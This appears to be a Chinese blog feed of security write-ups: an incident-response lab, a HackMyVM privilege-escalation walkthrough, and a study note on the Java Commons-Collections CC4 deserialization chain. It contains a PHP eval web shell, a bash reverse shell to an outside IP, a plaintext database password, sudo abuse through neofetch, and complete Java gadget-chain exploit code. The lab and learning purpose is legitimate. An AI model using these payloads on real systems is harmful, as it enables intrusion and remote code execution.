<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>直接grep上一题提取出来的ip</p>
<p>**awk -F’”‘ ‘{print $6}’**这里awk -F指定双引号为分割符，取第六个字段</p>
<blockquote>
<p>对于 Apache 访问日志，双引号内的字段通常是请求方法、URL、协议和 User-Agent 字符串。第六个字段通常是 User-Agent。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>

<h4 id="查看index-php页面被访问的次数，提交次数："><a href="#查看index-php页面被访问的次数，提交次数：" class="headerlink" title="查看index.php页面被访问的次数，提交次数："></a>查看index.php页面被访问的次数，提交次数：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>

<p><strong>wc -l</strong>用于统计行数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h4><p>和上一题差不多</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysql日志分析"><a href="#mysql日志分析" class="headerlink" title="mysql日志分析"></a>mysql日志分析</h3><h4 id="黑客第一次写入的shell-flag-关键字符串"><a href="#黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="黑客第一次写入的shell flag{关键字符串}"></a>黑客第一次写入的shell flag{关键字符串}</h4><p>找到sh.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客反弹shell的ip-flag-ip"><a href="#黑客反弹shell的ip-flag-ip" class="headerlink" title="黑客反弹shell的ip flag{ip}"></a>黑客反弹shell的ip flag{ip}</h4><p>在日志中发现adminer.php中存在sqk注入，用sys_eval实现命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
<p>主要在&#x2F;tmp&#x2F;1.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx"><a href="#黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>先猜测是udf提权，在common.php找到数据库连接的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">连接到数据库</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">看一下plugin设置的目录</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
<p>有两个udf.so</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>

<h4 id="黑客获取的权限-flag-whoami后的值"><a href="#黑客获取的权限-flag-whoami后的值" class="headerlink" title="黑客获取的权限 flag{whoami后的值}"></a>黑客获取的权限 flag{whoami后的值}</h4><p>udf提权后拿到的是mysql权限，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first 复盘</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80端口看不到什么内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txt里面是串base64字符，解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>扫到一个uploads目录和一个upload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
<p>蚁剑连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>成功拿到first到shell</p>
<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>下载到本地用ida分析一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>blog</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>cc4学习笔记</title>
    <url>/2025/02/20/cc4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li><a class="link"   href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html" >JDK8u65<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4" >openJDK 8u65<i class="fas fa-external-link-alt"></i></a></li>
<li>Maven 3.6.3</li>
<li>Commons-Collections 4.0</li>
</ul>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>这次的CC4 最后没有用到<code>InvokerTransformer</code>，而是<code>InstantiateTransformer</code>，看到他的<code>transform()</code>，之前CC3就接触到这个，后面有个实例化刚好符合类加载 所以这次的终点是<u>InstantiateTransformer#transform</u>，开始倒推</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223200903.png" ></p>
<p>发现<code>TransformingComparator#compare</code> 里面调用了transform()，而且里面的<code>this.tranformer</code>可以通过构造函数控制值</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223201028.png" ></p>
<p>再find usage，来到<code>PriorityQueue#siftDownComparable</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223201433.png" ></p>
<p>就这么一步一步往上找，最后刚好能找到有一个readObject入口，很顺利，链子倒推就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstantiateTransformer.transform()</span><br><span class="line">	-&gt; TransformingComparator.compare()</span><br><span class="line">		-&gt; PriorityQueue.siftDownComparable()</span><br><span class="line">			-&gt; PriorityQueue.siftFown()</span><br><span class="line">				-&gt; PriorityQueue.heapify()</span><br><span class="line">					-&gt; PriorityQueue.readObject()</span><br></pre></td></tr></table></figure>

<p>然后这里<code>TransformingComparator.compare()</code>就是public了，直接修改这后面的东西，前面那一段等反序列化自动调用即可</p>
<h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>先结合之前CC3的内容，尝试直接调用transform()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object filedValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(object,filedValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样执行成功弹出计算机，接下来尝试调用compare()</p>
<p>前面的内容不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">--&gt;</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        comparator.compare(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>没问题，接下来尝试把<code>comparator</code>包在<code>PriorityQueue</code>里面，然后直接尝试序列化反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"><span class="comment">//        comparator.compare(1,2);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是这次执行失败，按理说是没问题的，调试一下，把断点打在heapify()里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223203951.png" ></p>
<p>跟进，发现这个for都进不去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223210211.png" ></p>
<p>我们要控制<code>(size &gt;&gt;&gt; 1) - 1</code>运算结果大于等于0，size是2就好，那我们前面多给<code>priorityQueue</code>加两个东西，使得size是2就能进去for循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>这次再跟进就能进入for循环了，但是这次发现没有序列化反序列化就会弹计算机了</p>
<p>这次跟进到add里面，发现在add的过程中会跳到compare一次然后调用transform()后面一系列流程，相当于提前走了readObject流程的后半部份，让我联想到CC6里面其中一部份到了put也会自动弹计算机，解决思路就是在add的时候先控制对象里面没有我们要加载的字节码相关内容，add之后再通过反射修改回去</p>
<p>最后poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        comparator.compare(1,2);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(comparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>有了前面三个链子，再看CC4里面的问题，确实简单多了，希望自己写笔记的效率能高点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223214425.png" ></p>
<p>画了张小图，如果有错误十分欢迎找我指正🙏</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/" >https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/1vxyz/p/17473641.html" >https://www.cnblogs.com/1vxyz/p/17473641.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>cc2&amp;cc5&amp;cc7学习笔记</title>
    <url>/2025/02/24/cc2&amp;cc5&amp;cc7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最后几个链子，不算很难，写在一篇文章了，速战速决！</p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li><a class="link"   href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html" >JDK8u65<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4" >openJDK 8u65<i class="fas fa-external-link-alt"></i></a></li>
<li>Maven 3.6.3(其余版本可以先试试，不行再降版本)</li>
<li>Commons-Collections 4.0</li>
</ul>
